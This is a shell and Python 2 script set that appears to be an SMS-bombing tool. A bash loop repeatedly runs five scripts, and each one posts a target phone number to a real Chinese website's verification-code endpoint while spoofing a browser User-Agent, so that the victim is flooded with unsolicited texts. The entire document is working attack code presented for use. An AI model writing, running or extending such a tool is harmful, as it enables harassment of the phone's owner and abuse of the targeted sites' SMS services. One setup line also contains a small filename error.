#!/bin/bash

cd /root/send_code

for i in `ls`;do
    python $i $1
    sleep 2;
done


#####
mkdir /root/send_code && cd /root/send_code
touch {114,ele,mem,passprot,lonwin_code.py}_code.py
###########################################################################################################################################
####114_code.py
import urllib
import urllib2
import cookielib
import sys

Agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36"

#opener.addheaders=[("User-Agent","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36")]

url="http://www.114chn.com/eht/register/YanCode"

data={"phone":"%s"%(sys.argv[1])}

data=urllib.urlencode(data)

request=urllib2.Request(url,data=data)
request.add_header("User-Agent",Agent)

response=urllib2.urlopen(request).read()
print response
###########################################################################################################################################
####ele_code.py
import urllib
import urllib2
import cookielib
import sys

Agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36"

#opener.addheaders=[("User-Agent","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36")]

url="https://h5.ele.me/restapi/eus/login/mobile_send_code"

data={"mobile":"%s"%(sys.argv[1]),"captcha_value":"","captcha_hash":"","scf":"ms"}

data=urllib.urlencode(data)

request=urllib2.Request(url,data=data)
request.add_header("User-Agent",Agent)

response=urllib2.urlopen(request).read()
print response
###########################################################################################################################################
#####mem_code.py
import urllib
import urllib2
import cookielib
import sys

Agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36"

url="http://member.cabplink.com/sso/sendRegisterSMS.zaction?mobile=%s"%(sys.argv[1])

request=urllib2.Request(url)
request.add_header("User-Agent",Agent)

response=urllib2.urlopen(request).read()
print response
###########################################################################################################################################
#####passprot_code.py
import urllib
import urllib2
import cookielib
import sys

Agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36"

url="http://passport.cnmo.com/index.php?c=Member_Ajax_Register&m=SendMessageCode&Jsoncallback=jQuery183029507456273924304_1570100116192&mobile=%s&type=1&_=1570100154856"%(sys.argv[1])

request=urllib2.Request(url)
request.add_header("User-Agent",Agent)

response=urllib2.urlopen(request).read()
print response
###########################################################################################################################################
#####lonwin_code.py
import urllib
import urllib2
import cookielib
import sys

Agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36"

#opener.addheaders=[("User-Agent","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36")]

url="http://www.lonwin.org/Member/send_sms_reg.html"

data={"mobile":"%s"%(sys.argv[1])}

data=urllib.urlencode(data)

request=urllib2.Request(url,data=data)
request.add_header("User-Agent",Agent)

response=urllib2.urlopen(request).read()
print response
